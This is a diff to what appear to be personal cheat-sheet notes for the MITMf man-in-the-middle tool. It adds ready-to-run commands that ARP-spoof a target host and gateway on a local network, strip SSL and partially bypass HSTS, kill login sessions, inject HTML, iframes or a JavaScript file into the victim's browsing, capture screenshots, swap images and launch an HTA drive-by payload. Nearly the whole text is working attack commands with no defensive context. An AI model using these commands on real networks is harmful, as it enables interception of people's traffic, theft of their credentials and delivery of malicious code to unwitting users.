@@ -30,15 +30,26 @@ https://www.youtube.com/watch?v=NjNRzJV8Rvo
     -k : kill current login sesson
     --hsts: Enables SSLstrip+ for partial HSTS bypass.
 
+# SSLstrip
+mitmf --spoof --arp -i eth0 --target 192.168.3.133 --gateway 192.168.3.1 -k --hsts
+
 # inject HTML file as Iframe
 mitmf --spoof --arp -i eth0 --target 192.168.3.133 --gateway 192.168.3.1 -k --hsts --inject --html-file /path/to/index.html
 
 # inject HTML url as Iframe
 mitmf --spoof --arp -i eth0 --target 192.168.3.133 --gateway 192.168.3.1 -k --hsts --inject --html-url http://www.somesite.com
 
+# inject js file 
+mitmf --spoof --arp -i enp2s0 --target 192.168.3.133 --gateway 192.168.3.1 -k --hsts --inject --js-file /root/test.js
+
 # screen shoot
 mitmf --spoof --arp -i wlp3s0 --screen --interval 5 --target 192.168.3.133 --gateway 192.168.3.1
 
+# replace images
+mitmf --spoof --arp -i enp2s0 --target 192.168.3.133 --gateway 192.168.3.1 --imgrand --img-dir /app/Pictures/wallpaper/
+
+# replace HTA Drive-By
+mitmf --spoof --arp -i eth0 --target 192.168.3.133 --gateway 192.168.3.1 -k --hsts --hta
 
 #############################
 #  todo sslstrip2
